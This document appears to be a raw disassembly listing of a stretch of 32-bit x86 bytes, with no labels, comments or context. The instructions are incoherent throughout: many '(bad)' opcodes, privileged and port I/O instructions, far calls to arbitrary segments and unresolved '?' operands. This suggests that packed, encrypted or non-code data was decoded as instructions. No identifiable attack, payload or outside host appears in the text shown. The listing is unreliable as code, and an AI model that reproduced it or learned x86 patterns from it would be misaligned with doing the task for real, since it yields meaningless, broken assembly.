  4150a5:	ficomp WORD PTR [ebp-0x46]
  4150a8:	xor    dh,BYTE PTR [eax+0x38]
  4150ab:	call   0x1890fa89
  4150b0:	cwde   
  4150b1:	xor    bl,ah
  4150b3:	fbld   TBYTE PTR [ecx]
  4150b5:	sub    dh,ch
  4150b7:	inc    ebp
  4150b8:	jae    0x4150b6
  4150ba:	clc    
  4150bb:	call   0x1070:0xa7077d73
  4150c2:	fdiv   QWORD PTR [ecx-0x78]
  4150c5:	add    eax,0x69f683f6
  4150ca:	and    dh,BYTE PTR [ebp+0x37]
  4150cd:	das    
  4150ce:	dec    ebp
  4150cf:	call   0x2804348a
  4150d4:	adc    edi,DWORD PTR [ecx]
  4150d6:	fs pop edx
  4150d8:	pushf  
  4150d9:	mov    BYTE PTR [eax+0x26b0cb22],bh
  4150df:	xchg   esi,ecx
  4150e1:	mov    dl,0xa6
  4150e3:	sbb    eax,0x43fef61b
  4150e8:	jle    0x41509f
  4150ea:	mov    ds:0x34f1cf0a,eax
  4150ef:	sub    BYTE PTR [ebp+0x5a],al
  4150f2:	sar    eax,1
  4150f4:	stc    
  4150f5:	xor    DWORD PTR [edx+0x4bd6a4a7],0xc9450681
  4150ff:	dec    esi
  415100:	or     edx,edi
  415102:	jg     0x41515f
  415104:	loope  0x4150fd
  415106:	pop    ecx
  415107:	jne    0x415176
  415109:	jl     0x4150f9
  41510b:	sbb    DWORD PTR [esi],edi
  41510d:	nop
  41510e:	or     ch,BYTE PTR [eax]
  415110:	ins    BYTE PTR es:[edi],dx
  415111:	push   cs
  415112:	lea    ebp,[ecx]
  415114:	sbb    dh,BYTE PTR [ecx+0x6fe6a7cd]
  41511a:	outs   dx,BYTE PTR ds:[esi]
  41511b:	js     0x4150fd
  41511d:	sub    DWORD PTR [ebx-0x53],esp
  415120:	int    0xac
  415122:	push   eax
  415123:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415124:	(bad)  
  415125:	jp     0x415149
  415127:	mov    WORD PTR [edx-0x6f089d3a],fs
  41512d:	and    eax,0xffffffa6
  415130:	sbb    al,BYTE PTR [edi]
  415132:	mov    eax,ds:0x414ebf1e
  415137:	iret   
  415138:	jge    0x415118
  41513a:	shl    esi,0xc3
  41513d:	mov    ecx,0xe2c58e67
  415142:	adc    al,0x16
  415144:	and    esi,DWORD PTR ds:0x481eb7c6
  41514a:	sub    esi,DWORD PTR [ebx+0x65b32fff]
  415150:	test   BYTE PTR [edi],bh
  415152:	lea    edi,[ebx-0x7917cae1]
  415158:	ja     0x4151af
  41515a:	sbb    al,0x61
  41515c:	(bad)  
  41515d:	jmp    FWORD PTR [eax]
  41515f:	xor    dl,bl
  415161:	mov    bh,0xc9
  415163:	sahf   
  415164:	inc    esi
  415165:	inc    eax
  415166:	iret   
  415167:	fs push ebx
  415169:	xchg   ebx,eax
  41516a:	ins    DWORD PTR es:[edi],dx
  41516b:	or     eax,0xf60b502c
  415170:	ret    
  415171:	scas   eax,DWORD PTR es:[edi]
  415172:	fisttp WORD PTR [esi-0x4a]
  415175:	sbb    al,0xf5
  415177:	sbb    BYTE PTR [ecx-0x5c],dl
  41517a:	jmp    0x3d908a6c
  41517f:	in     al,0x12
  415181:	cmp    BYTE PTR [edi+0x373d170f],dl
  415187:	iret   
  415188:	rol    ch,1
  41518a:	cmp    edx,DWORD PTR [esi+0x42]
  41518d:	jg     0x4151d3
  41518f:	mov    ebx,0x3e8ad45a
  415194:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415195:	test   eax,0x7784eec0
  41519a:	call   0x72aa6951
  41519f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151a0:	dec    esi
  4151a1:	add    esp,DWORD PTR [edi-0x5]
  4151a4:	aad    0x89
  4151a6:	xlat   BYTE PTR ds:[ebx]
  4151a7:	lds    esi,FWORD PTR [ebx-0x7b]
  4151aa:	es daa 
  4151ac:	inc    esp
  4151ad:	imul   edi,DWORD PTR [ecx],0x1a43ac56
  4151b3:	mov    esi,DWORD PTR [ebx-0x6c88a959]
  4151b9:	add    eax,0x5474918d
  4151be:	fimul  DWORD PTR [edi]
  4151c0:	ds dec eax
  4151c2:	lock cmp eax,DWORD PTR [edi+0x68]
  4151c6:	push   edx
  4151c7:	jmp    0xb38b:0x16598e7c
  4151ce:	mov    edx,0xf426f576
  4151d3:	scas   al,BYTE PTR es:[edi]
  4151d4:	ret    
  4151d5:	sar    DWORD PTR [edx-0x5bd62ca0],1
  4151db:	adc    ebx,DWORD PTR [ecx+0x4d]
  4151de:	imul   esp,ebx,0x4e86c87a
  4151e4:	fwait
  4151e5:	cmp    DWORD PTR [eax-0x31e60b6e],ebp
  4151eb:	in     eax,0x28
  4151ed:	jp     0x4151d8
  4151ef:	into   
  4151f0:	(bad)  
  4151f2:	test   eax,0x6ddb19a3
  4151f7:	lahf   
  4151f8:	push   ecx
  4151f9:	push   0xe99261f4
  4151fe:	sahf   
  4151ff:	cmp    DWORD PTR [ebp-0x69],ecx
  415202:	addr16 push edx
  415204:	nop
  415205:	mov    ah,0x6c
  415207:	test   dh,dl
  415209:	cs enter 0x7d06,0xb7
  41520e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41520f:	jbe    0x4151c8
  415211:	mov    DWORD PTR [esi-0x67d69c6],esp
  415217:	sub    ecx,DWORD PTR [ecx]
  415219:	push   ss
  41521a:	sti    
  41521b:	add    ebp,DWORD PTR [ebx-0x380d477d]
  415221:	(bad)  
  415222:	in     eax,dx
  415223:	test   ecx,edi
  415225:	xlat   BYTE PTR ds:[ebx]
  415226:	dec    eax
  415227:	inc    ecx
  415228:	add    bh,0x4e
  41522b:	sbb    ecx,eax
  41522d:	arpl   WORD PTR [edi],di
  41522f:	push   ebp
  415230:	arpl   WORD PTR [edi+0x5d],si
  415233:	ret    0x2cbd
  415236:	js     0x415268
  415238:	push   esp
  415239:	(bad)  
  41523b:	xchg   ecx,eax
  41523c:	aam    0xaa
  41523e:	jbe    0x4151d4
  415240:	adc    ah,ch
  415242:	xchg   edi,eax
  415243:	aam    0x4b
  415245:	jmp    0xfbc593d0
  41524a:	cld    
  41524b:	inc    eax
  41524c:	and    ebx,ecx
  41524e:	sbb    eax,0xe2a9a20c
  415253:	mov    al,0xa5
  415255:	pop    ss
  415256:	add    DWORD PTR [ebx],ebp
  415258:	jo     0x415281
  41525a:	ret    0x5ea6
  41525d:	xchg   esi,eax
  41525e:	retf   
  41525f:	mov    bl,0x35
  415261:	push   ds
  415262:	call   0xf581:0x9ff18532
  415269:	jb     0x4152b8
  41526b:	fcmovnbe st,st(1)
  41526d:	mov    WORD PTR [edx+0x2],ss
  415270:	xchg   ecx,eax
  415271:	xchg   edx,eax
  415272:	jge    0x415286
  415274:	sbb    ebx,DWORD PTR [esi]
  415276:	sar    BYTE PTR [eax],0xbe
  415279:	mov    ebx,0x432e3390
  41527e:	push   eax
  41527f:	lds    edi,FWORD PTR ds:0xd52a4d82
  415285:	test   eax,0x5aebc80c
  41528a:	sub    BYTE PTR [esi+0x62dcbad0],cl
  415290:	rol    DWORD PTR [edx-0x6d],0x91
  415294:	jge    0x4152cb
  415296:	lock (bad) 
  415298:	xor    al,ch
  41529a:	cmp    BYTE PTR [eax+0x7],al
  41529d:	scas   al,BYTE PTR es:[edi]
  41529e:	xchg   esp,eax
  41529f:	daa    
  4152a0:	pop    ebx
  4152a1:	and    eax,0xdfc5037
  4152a6:	inc    ebp
  4152a7:	and    eax,0x9f332e1
  4152ac:	add    DWORD PTR [ecx+0x78b583bc],ecx
  4152b2:	rcr    BYTE PTR [eax+0x65f7ad0c],1
  4152b8:	push   eax
  4152b9:	out    0x72,al
  4152bb:	jle    0x4152b1
  4152bd:	push   0x7b
  4152bf:	retf   
  4152c0:	rcl    dh,1
  4152c2:	mov    bh,0x9d
  4152c4:	ds xor al,0x4
  4152c7:	or     BYTE PTR [ebx+0x24],al
  4152ca:	dec    ebx
  4152cb:	or     esp,ebp
  4152cd:	arpl   WORD PTR [edx+0x4d6f3ab5],bx
  4152d3:	shl    BYTE PTR [ebp+eiz*2+0x5fabbed3],cl
  4152da:	dec    edi
  4152db:	repnz xchg esi,eax
  4152dd:	mov    eax,0xc9ac106d
  4152e2:	(bad)  
  4152e3:	adc    ebp,ebx
  4152e5:	cmp    ch,ch
  4152e7:	sbb    dh,BYTE PTR [ecx]
  4152e9:	mov    bh,0xcb
  4152eb:	aad    0xbf
  4152ed:	fs add eax,0xe0983407
  4152f3:	mov    dl,0xd5
  4152f5:	pusha  
  4152f6:	xor    BYTE PTR [esi+0x52],bl
  4152f9:	inc    esi
  4152fa:	loope  0x4152b3
  4152fc:	add    DWORD PTR [ebp*8-0x14fc366c],ebp
  415303:	sbb    dh,cl
  415305:	add    edx,DWORD PTR [eax]
  415307:	imul   esi,DWORD PTR [edi],0x19
  41530a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41530b:	mov    bl,0xb0
  41530d:	mov    al,0x11
  41530f:	push   esi
  415310:	adc    dl,BYTE PTR [eax]
  415312:	mov    edx,?
  415314:	jo     0x4152d4
  415316:	xor    cl,dh
  415318:	fsubr  DWORD PTR [esi-0x7c]
  41531b:	and    al,BYTE PTR [eax-0x40]
  41531e:	(bad)  [esi-0x3963be74]
  415324:	push   ds
  415325:	jl     0x41539a
  415327:	dec    esi
  415328:	shl    DWORD PTR [edi+0x5c43ae35],1
  41532e:	dec    esp
  41532f:	jmp    0xb5cb874a
  415334:	clc    
  415335:	retf   0xfe12
  415338:	scas   al,BYTE PTR es:[edi]
  415339:	aad    0xee
  41533b:	iretw  
  41533d:	mul    BYTE PTR ss:[ecx-0x39]
  415341:	out    0x12,eax
  415343:	or     ch,BYTE PTR [edi-0x4b]
  415346:	cmc    
  415347:	adc    edx,eax
  415349:	pop    esi
  41534a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41534b:	push   es
  41534c:	jne    0x4152e5
  41534e:	adc    eax,0xa0911676
  415353:	aad    0x1f
  415355:	not    DWORD PTR [edx]
  415357:	jne    0x4152dc
  415359:	hlt    
  41535a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41535b:	loope  0x415352
  41535d:	xchg   ebx,eax
  41535e:	cwde   
  41535f:	scas   al,BYTE PTR es:[edi]
  415360:	and    ecx,edx
  415362:	sbb    eax,0x7a22b10e
  415367:	div    BYTE PTR [edx]
  415369:	sub    eax,0xfb2d6fb8
  41536e:	retf   
  41536f:	push   ebp
  415370:	cli    
  415371:	loop   0x415345
  415373:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415374:	jmp    0x415334
  415376:	icebp  
  415377:	ins    DWORD PTR es:[edi],dx
  415378:	rol    edi,0xab
  41537b:	xlat   BYTE PTR ds:[ebx]
  41537c:	xlat   BYTE PTR ds:[ebx]
  41537d:	dec    esp
  41537e:	ins    DWORD PTR es:[edi],dx
  41537f:	push   eax
  415380:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415381:	pop    esi
  415382:	inc    ebp
  415383:	push   0xffffffbc
  415385:	push   0x5f
  415387:	jg     0x4153c7
  415389:	imul   eax,DWORD PTR [esi+0x28],0xffffffb1
  41538d:	xchg   edx,eax
  41538e:	shl    DWORD PTR [edx],cl
  415390:	stos   DWORD PTR es:[edi],eax
  415391:	addr16 jbe 0x41531e
  415394:	mov    eax,ds:0xe8c2789d
  415399:	int    0x2a
  41539b:	(bad)  
  41539c:	sub    al,0xae
  41539e:	inc    ebx
  41539f:	mov    ecx,0xbc9542e0
  4153a4:	imul   esp,esi,0x1b
  4153a7:	sub    bh,dl
  4153a9:	aad    0x4f
  4153ab:	mov    dh,0xb3
  4153ad:	aas    
  4153ae:	dec    ebp
  4153af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153b0:	dec    ebx
  4153b1:	pop    ecx
  4153b2:	div    DWORD PTR [edx+0x5bee32ac]
  4153b8:	or     dh,BYTE PTR [edi-0x40]
  4153bb:	idiv   BYTE PTR [ebx-0x3d]
  4153be:	add    bl,BYTE PTR [ecx-0x20]
  4153c1:	xor    ebp,0x3f
  4153c4:	dec    esi
  4153c5:	jecxz  0x415369
  4153c7:	mov    dh,0x35
  4153c9:	rcl    ecx,0x1e
  4153cc:	add    eax,0x6e151066
  4153d1:	aas    
  4153d2:	repnz jecxz 0x4153f1
  4153d5:	jne    0x4153ca
  4153d7:	adc    ebx,DWORD PTR ds:0xed40d6c2
  4153dd:	xchg   DWORD PTR [edx-0x69],esp
  4153e0:	xor    al,0x47
  4153e2:	out    dx,eax
  4153e3:	inc    esi
  4153e4:	jae    0x415438
  4153e6:	cs inc esi
  4153e8:	jmp    0x37967058
  4153ed:	lods   eax,DWORD PTR ds:[esi]
  4153ee:	jle    0x41545a
  4153f0:	xchg   esp,eax
  4153f1:	lods   al,BYTE PTR ds:[esi]
  4153f2:	cs push cs
  4153f4:	cmp    BYTE PTR [esi-0x521af34b],dh
  4153fa:	ins    DWORD PTR es:[edi],dx
  4153fb:	popf   
  4153fc:	jo     0x415413
  4153fe:	lds    ecx,FWORD PTR [edx]
  415400:	push   edx
  415401:	add    al,BYTE PTR [ecx]
  415403:	nop
  415404:	jle    0x4153c1
  415406:	hlt    
  415407:	push   ss
  415408:	adc    BYTE PTR [edx],al
  41540a:	xchg   edi,eax
  41540b:	mov    ds:0x8d96be28,al
  415410:	call   0x9e9cc68f
  415415:	or     eax,0x7e94b8b4
  41541a:	je     0x415453
  41541c:	dec    esi
  41541d:	pop    DWORD PTR [esp+ebp*4-0x49]
  415421:	push   esp
  415422:	lds    edx,FWORD PTR [ebx+0x34ab5c8]
  415428:	ins    DWORD PTR es:[edi],dx
  415429:	scas   al,BYTE PTR es:[edi]
  41542a:	pop    edi
  41542b:	sub    eax,0x5dbf6043
  415430:	pop    ds
  415431:	jae    0x415445
  415433:	test   al,0xef
  415435:	inc    ebp
  415436:	(bad)  
  415437:	fidivr WORD PTR [eax-0x38]
  41543a:	inc    ebx
  41543b:	enter  0xf886,0xf5
  41543f:	adc    bh,ch
  415441:	call   0x45d:0x46dd0c03
  415448:	adc    dh,BYTE PTR [ecx+0x6da36d1e]
  41544e:	mov    al,0x2f
  415450:	in     eax,0xe
  415452:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415453:	repz or bl,BYTE PTR [esi-0x4a]
  415457:	jo     0x41549e
  415459:	xchg   edi,eax
  41545a:	neg    DWORD PTR [edx-0x47]
  41545d:	les    ebp,FWORD PTR [eax+0x14]
  415460:	jle    0x415458
  415462:	sub    BYTE PTR [edi+ecx*2+0x6c],dh
  415466:	(bad)  
  415467:	repz cli 
  415469:	xchg   DWORD PTR ds:0xd985b7c1,edx
  41546f:	jbe    0x415409
  415471:	data16 mov WORD PTR [esi+0x34],ds
  415475:	cli    
  415476:	shr    DWORD PTR [edi+ecx*2+0x41402a0a],0xa0
  41547e:	loop   0x4154c8
  415480:	pop    eax
  415481:	mov    dl,0x37
  415483:	cmp    al,0x54
  415485:	push   ebp
  415486:	jnp    0x415494
  415488:	ins    DWORD PTR es:[edi],dx
  415489:	add    al,0x48
  41548b:	pop    ss
  41548c:	xchg   esp,eax
  41548d:	cs aas 
  41548f:	clc    
  415490:	retf   
  415491:	jns    0x415456
  415493:	fimul  WORD PTR [ebx+0x55]
  415496:	push   ss
  415497:	add    DWORD PTR [edi],esi
  415499:	in     eax,dx
  41549a:	add    esi,DWORD PTR [edx+0x44a20d28]
  4154a0:	xchg   BYTE PTR [esi-0x39],ah
  4154a3:	shr    BYTE PTR [edi+0x2b03969b],cl
  4154a9:	fistp  WORD PTR ds:0x7c93
  4154ae:	mov    bh,0x6b
  4154b0:	pop    es
  4154b1:	inc    esi
  4154b2:	aam    0x5b
  4154b4:	pop    ebp
  4154b5:	imul   esp,DWORD PTR [ecx+esi*1-0x3c5ddf86],0x50
  4154bd:	pop    ds
  4154be:	inc    ecx
  4154bf:	fucom  st(7)
  4154c1:	adc    eax,0x90f9c77
  4154c6:	mov    ch,0x5a
  4154c8:	dec    edi
  4154c9:	sahf   
  4154ca:	bound  ecx,QWORD PTR [ebp+0x60]
  4154cd:	and    al,0x9f
  4154cf:	and    esp,DWORD PTR ss:[ebx+0x7e]
  4154d3:	aam    0xcf
  4154d5:	cdq    
  4154d6:	xlat   BYTE PTR ds:[ebx]
  4154d7:	(bad)  
  4154d9:	and    al,0xf7
  4154db:	scas   eax,DWORD PTR es:[edi]
  4154dc:	jbe    0x4154ce
  4154de:	xchg   edx,eax
  4154df:	pop    edx
  4154e0:	retf   0x834
  4154e3:	ins    BYTE PTR es:[edi],dx
  4154e4:	pop    ds
  4154e5:	in     al,dx
  4154e6:	into   
  4154e7:	enter  0x9360,0x77
  4154eb:	test   al,0xc9
  4154ed:	cmp    al,BYTE PTR [ebp+0x4c]
  4154f0:	jbe    0x415535
  4154f2:	jl     0x4154e6
  4154f4:	fldcw  WORD PTR [edi+esi*1+0x6a]
  4154f8:	mov    dl,0xc5
  4154fa:	cwde   
  4154fb:	jne    0x41549f
  4154fd:	les    esi,FWORD PTR [ecx-0x3e607844]
  415503:	jmp    0x81904922
  415508:	loop   0x41552d
  41550a:	mov    ds:0xfe1293b,eax
  41550f:	xchg   ebp,eax
  415510:	stos   DWORD PTR es:[edi],eax
  415511:	(bad)  
  415513:	jg     0x415571
  415515:	and    DWORD PTR cs:[edx-0x46],0xffffffbd
  41551a:	gs cwde 
  41551c:	and    esi,DWORD PTR [edi-0x26]
  41551f:	in     eax,dx
  415520:	call   0x43308aa8
  415525:	mov    ds:0x5a92ed7e,eax
  41552a:	ja     0x415524
  41552c:	jle    0x4154ff
  41552e:	adc    BYTE PTR [ebp-0x56a24036],ah
  415534:	int3   
  415535:	mov    bh,0x1e
  415537:	mov    bh,0xda
  415539:	xchg   ebx,eax
  41553a:	adc    al,dl
  41553c:	mov    cl,0xa
  41553e:	int    0xad
  415540:	cwde   
  415541:	mov    cl,0xfd
  415543:	cs xchg ecx,eax
  415545:	mov    tr3,esi
  415548:	and    DWORD PTR [esi+edi*2],edi
  41554b:	fld    QWORD PTR [ebp+eiz*4-0x2509e0e8]
  415552:	sub    cl,BYTE PTR [ebp-0x4c]
  415555:	add    BYTE PTR [ebp+0xd],dl
  415558:	mov    eax,DWORD PTR ds:0x2eb43cca
  41555e:	into   
  41555f:	and    DWORD PTR [ebp+0x6a],0xd3dbb8e4
  415566:	call   0xaf20aeac
  41556b:	push   esp
  41556c:	in     eax,0x8e
  41556e:	fnstcw WORD PTR [edx]
  415570:	sar    BYTE PTR [ecx],1
  415572:	ret    0xbc11
  415575:	sub    bh,al
  415577:	cmp    eax,0x3902e490
  41557c:	mov    dh,0x24
  41557e:	pop    ecx
  41557f:	pop    edx
  415580:	sub    ebx,ebx
  415582:	sbb    al,ch
  415584:	mov    dl,0x8a
  415586:	sbb    ecx,DWORD PTR [ebp-0x30]
  415589:	push   ecx
  41558a:	jle    0x4155f2
  41558c:	add    DWORD PTR [ebx-0x1a],esp
  41558f:	jne    0x4155eb
  415591:	lea    esp,[ecx-0xe49daa8]
  415597:	fsub   QWORD PTR [edx+0x7d]
  41559a:	cwde   
  41559b:	and    al,0x58
  41559d:	adc    ebp,ebx
  41559f:	outs   dx,BYTE PTR ds:[esi]
  4155a0:	stos   BYTE PTR es:[edi],al
  4155a1:	mov    ebp,0xe17f9216
  4155a6:	and    eax,0x5a018173
  4155ab:	inc    edi
  4155ac:	sar    BYTE PTR ds:0xd8e6d802,0xd3
  4155b3:	hlt    
  4155b4:	xor    DWORD PTR [bp+di],esp
  4155b7:	xor    esi,edi
  4155b9:	in     al,dx
  4155ba:	aaa    
  4155bb:	fsubr  DWORD PTR [ebx-0x1fa8e6fb]
  4155c1:	add    DWORD PTR [ebx],edx
  4155c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155c4:	lea    edx,[eax+ebx*2-0x16]
  4155c8:	loop   0x4155e8
  4155ca:	out    dx,eax
  4155cb:	sbb    al,0x6c
  4155cd:	aad    0xcd
  4155cf:	mov    BYTE PTR [ebp-0x32],ah
  4155d2:	adc    ah,BYTE PTR [ebx]
  4155d4:	mov    ecx,0x856a58d0
  4155d9:	call   0xf5c124cd
  4155de:	repz ret 0xced7
  4155e2:	mov    ch,0x72
  4155e4:	and    bh,BYTE PTR [ecx+0x73]
  4155e7:	pop    edi
  4155e8:	hlt    
  4155e9:	mov    al,0x50
  4155eb:	dec    eax
  4155ec:	outs   dx,DWORD PTR ds:[esi]
  4155ed:	cwde   
  4155ee:	mov    eax,0x8cabd73f
  4155f3:	popa   
  4155f4:	and    al,0x28
  4155f6:	lods   al,BYTE PTR ds:[esi]
  4155f7:	outs   dx,BYTE PTR ds:[esi]
  4155f8:	fimul  WORD PTR [ebx]
  4155fa:	sub    al,0x2d
  4155fc:	xchg   ecx,eax
  4155fd:	mov    BYTE PTR [ebx+0x1b0d8287],cl
  415603:	scas   eax,DWORD PTR es:[edi]
  415604:	icebp  
  415605:	sbb    bl,ch
  415607:	or     ah,BYTE PTR [ebp-0x62]
  41560a:	loopne 0x41558c
  41560c:	push   cs
  41560d:	push   eax
  41560e:	jae    0x415657
  415610:	ret    
  415611:	mov    ch,0x87
  415613:	pop    ebx
  415614:	xchg   BYTE PTR ds:0xf3e07e63,ah
  41561a:	int    0x9a
  41561c:	add    ebp,DWORD PTR [edx+0x4898bd95]
  415622:	les    ebp,FWORD PTR [edi+0x5e]
  415625:	xchg   ecx,eax
  415626:	xor    eax,0xb28ea6e6
  41562b:	rcr    BYTE PTR ds:0xdfeacd59,0xb1
  415632:	mov    esp,0x84e88eae
  415637:	and    ebx,DWORD PTR [ebx]
  415639:	and    al,0x81
  41563b:	xchg   esi,eax
  41563c:	lds    esp,FWORD PTR [eax-0x24]
  41563f:	popf   
  415640:	pop    es
  415641:	xor    DWORD PTR [ebp-0x71bee266],edi
  415647:	arpl   si,sp
  415649:	sub    eax,0x241ae4bf
  41564e:	xchg   ebx,eax
  41564f:	push   ebp
  415650:	imul   ecx,esi,0xc3815788
  415656:	lahf   
  415657:	jecxz  0x41566c
  415659:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41565a:	xchg   edx,eax
  41565b:	mov    ds:0x4ba11fb6,al
  415660:	or     al,0xe
  415662:	adc    cl,BYTE PTR [ebx-0x62c466d8]
  415668:	aaa    
  415669:	cld    
  41566a:	pop    ds
  41566b:	bound  edi,QWORD PTR [edx+0x1d2f6fe7]
  415671:	xchg   ecx,eax
  415672:	aam    0x30
  415674:	das    
  415675:	sub    eax,0x2118fa2b
  41567a:	rol    DWORD PTR [edx],cl
  41567c:	les    esi,FWORD PTR [edi+0x6995dbe5]
  415682:	loopne 0x4156fd
  415684:	fwait
  415685:	repz add BYTE PTR [edx],0x61
  415689:	add    BYTE PTR [eax],dl
  41568b:	ffree  st(1)
  41568d:	inc    eax
  41568e:	or     ah,cl
  415690:	sbb    esi,DWORD PTR [ebp-0x7a30f38e]
  415696:	pop    es
  415697:	das    
  415698:	enter  0x14b7,0xae
  41569c:	mov    BYTE PTR ds:0xa232d6ae,ah
  4156a2:	xor    dl,dh
  4156a4:	fst    QWORD PTR [ebp+0x70]
  4156a7:	pop    ebp
  4156a8:	shl    DWORD PTR [eax+0x18],0x6c
  4156ac:	retf   0x49c2
  4156af:	enter  0x2d19,0x34
  4156b3:	call   0x86b:0xc11ee448
  4156ba:	pusha  
  4156bb:	push   esi
  4156bc:	push   edx
  4156bd:	mov    ds:0xfa9c7ab3,eax
  4156c2:	iret   
  4156c3:	inc    esp
  4156c4:	mov    ds,esp
  4156c6:	ret    0x4e9c
  4156c9:	mov    bl,BYTE PTR [eax+0x42317cb3]
  4156cf:	xchg   esi,eax
  4156d0:	xor    al,0x98
  4156d2:	jne    0x41573f
  4156d4:	cmp    al,0x2a
  4156d6:	(bad)
  4156d9:	pusha  
  4156da:	adc    edx,DWORD PTR [ebx]
  4156dc:	pop    ecx
  4156dd:	adc    bl,bl
  4156df:	les    ecx,FWORD PTR [edi+0x3845217e]
  4156e5:	fs pushf 
  4156e7:	in     al,dx
  4156e8:	dec    ecx
  4156e9:	sbb    DWORD PTR [esi+0x6585f89b],0xfffffff6
  4156f0:	dec    ebp
  4156f1:	sbb    al,0xc9
  4156f3:	dec    ecx
  4156f4:	push   ds
  4156f5:	push   ss
  4156f6:	rcr    bh,cl
  4156f8:	lahf   
  4156f9:	or     eax,0x69de0253
  4156fe:	xchg   edi,eax
  4156ff:	mov    bl,0x63
  415701:	ret    0x1efc
  415704:	mov    ebx,0x86cbf378
  415709:	retf   0xb39d
  41570c:	inc    ebx
  41570d:	xor    edi,DWORD PTR [edx+0x21f26aef]
  415713:	adc    edi,esp
  415715:	cs scas al,BYTE PTR es:[edi]
  415717:	and    al,0xc2
  415719:	or     BYTE PTR [ecx],0x86
  41571c:	or     al,0xdd
  41571e:	inc    eax
  41571f:	pop    eax
  415720:	and    DWORD PTR [edx],edi
  415722:	(bad)  
  415723:	(bad)  [esi-0x31]
  415726:	aam    0xf
  415728:	retf   
  415729:	push   0x18
  41572b:	xor    DWORD PTR [edi+0x7c],0x43554047
  415732:	pop    edx
  415733:	shr    ecx,1
  415735:	nop
  415736:	jmp    0x4157ac
  415738:	push   edi
  415739:	and    BYTE PTR [eax+0x641ad209],bh
  41573f:	xchg   BYTE PTR [ecx],ch
  415741:	xchg   edi,eax
  415742:	sub    BYTE PTR [esi],ch
  415744:	(bad)  
  415746:	lods   eax,DWORD PTR ds:[esi]
  415747:	mov    esp,0x8873d62f
  41574c:	add    ah,BYTE PTR [edx+0x7f]
  41574f:	or     bh,dl
  415751:	cdq    
  415752:	mov    BYTE PTR [eax-0x1c5916c7],bl
  415758:	shr    BYTE PTR [esi-0x50eae959],0x1c
  41575f:	cld    
  415760:	sub    eax,0xf20a90fd
  415765:	pusha  
  415766:	in     eax,0x7f
  415768:	xor    cl,BYTE PTR [edx-0x26]
  41576b:	or     al,0x39
  41576d:	cmp    dl,BYTE PTR [ebx]
  41576f:	inc    eax
  415770:	out    0x8,al
  415772:	mov    ds:0x5b6f97b,eax
  415777:	fnstsw WORD PTR [si+0x433c]
  41577c:	outs   dx,DWORD PTR ds:[esi]
  41577d:	leave  
  41577e:	outs   dx,BYTE PTR ds:[esi]
  41577f:	loopne 0x4157f7
  415781:	mov    bh,BYTE PTR [edi+ebp*1]
  415784:	push   ds
  415785:	jl     0x4157ec
  415787:	sub    eax,0xc96bf82d
  41578c:	push   ecx
  41578d:	mov    gs:0xe54247d4,eax
  415793:	mov    BYTE PTR [esi],dh
  415795:	pop    ss
  415796:	pop    edi
  415797:	je     0x415739
  415799:	loope  0x415754
  41579b:	inc    ecx
  41579c:	arpl   WORD PTR [eax],bx
  41579e:	jle    0x4157ca
  4157a0:	pop    esi
  4157a1:	into   
  4157a2:	popf   
  4157a3:	xor    bh,al
  4157a5:	paddsw mm0,QWORD PTR [eax+0x3cf96e2f]
  4157ac:	xchg   ebp,eax
  4157ad:	xchg   ecx,eax
  4157ae:	data16 sahf 
  4157b0:	sbb    BYTE PTR [ecx+0x39],cl
  4157b3:	outs   dx,DWORD PTR ds:[esi]
  4157b4:	ret    
  4157b5:	mov    eax,0xb8295cbf
  4157ba:	cmp    ecx,DWORD PTR [edi+ebp*4-0x61e4861d]
  4157c1:	inc    ecx
  4157c2:	adc    esi,edi
  4157c4:	cmp    edi,esp
  4157c6:	aam    0x30
  4157c8:	int3   
  4157c9:	in     al,dx
  4157ca:	imul   esp,DWORD PTR [esi-0x68],0x284ec5bd
  4157d1:	gs or  dh,cl
  4157d4:	enter  0xbc45,0xb3
  4157d8:	push   ds
  4157d9:	test   DWORD PTR [ebx+0x29],esp
  4157dc:	nop
  4157dd:	sub    BYTE PTR [eax],0x84
  4157e0:	mov    eax,ds:0x5a22baa
  4157e5:	test   DWORD PTR [esi+eiz*4+0x64924cfa],ecx
  4157ec:	inc    ecx
  4157ed:	dec    edi
  4157ee:	mov    dh,0x5
  4157f0:	fidivr DWORD PTR [eax+ebp*2+0x30]
  4157f4:	ins    DWORD PTR es:[edi],dx
  4157f5:	pop    esi
  4157f6:	xor    al,0x51
  4157f8:	out    0x1a,eax
  4157fa:	mov    al,ds:0x25596e31
  4157ff:	add    esp,DWORD PTR [ecx]
  415801:	sub    eax,0xf6c7bb06
  415806:	jae    0x41584a
  415808:	mov    edx,0x1ef3197e
  41580d:	or     eax,0x49bce932
  415812:	xchg   ecx,eax
  415813:	inc    edi
  415814:	xor    al,0xf1
  415816:	cs retf 0x26d1
  41581a:	mov    ?,WORD PTR [ebp-0x44c04254]
  415820:	xchg   ebx,eax
  415821:	cmp    bh,ah
  415823:	add    DWORD PTR [edx],edi
  415825:	(bad)  
  415826:	mov    ds:0x6d3211b3,al
  41582b:	pop    ss
  41582c:	pop    esi
  41582d:	lock out dx,al
  41582f:	sub    DWORD PTR [ebx+eax*1],0x50
  415833:	push   cs
  415834:	adc    DWORD PTR [ebp+0x4e212f1],eax
  41583a:	nop
  41583b:	aaa    
  41583c:	out    dx,al
  41583d:	pop    eax
  41583e:	sub    eax,DWORD PTR [ebx+0x123ac11c]
  415844:	mov    DWORD PTR [edx+0x1],esp
  415847:	(bad)  
  415848:	jmp    0x358:0xa9b70caf
  41584f:	xchg   esi,eax
  415850:	mov    WORD PTR [edx-0x28],fs
  415853:	test   eax,0x88c0544e
  415858:	daa    
  415859:	in     eax,dx
  41585a:	jg     0x415854
  41585c:	and    DWORD PTR [ebx+edx*4-0x7a5c64b7],edi
  415863:	push   ds
  415864:	stos   BYTE PTR es:[edi],al
  415865:	xchg   BYTE PTR [eax+0x5fe22dc8],ch
